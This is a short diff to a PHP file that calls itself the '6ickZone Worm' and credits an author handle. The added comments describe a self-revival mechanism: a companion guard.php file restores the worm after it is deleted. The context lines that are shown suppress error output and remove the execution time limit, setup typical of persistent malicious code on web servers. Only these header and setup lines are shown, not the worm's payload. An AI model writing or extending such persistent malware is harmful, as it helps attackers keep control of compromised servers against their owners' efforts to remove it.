@@ -1,10 +1,11 @@
 <?php
 /*
  * [6ickZone is Worm]
+ * This is 6ickZone Worm v1 — Resurrection mechanism is *external*.
+ * To enable self-revival after deletion, make sure `guard.php` exists in the same directory.
  * 6ickwhispers@gmail.com
  * by 0x6ick
  */
-
 set_time_limit(0);
 ini_set('display_errors', 0);
 ini_set('display_startup_errors', 0);
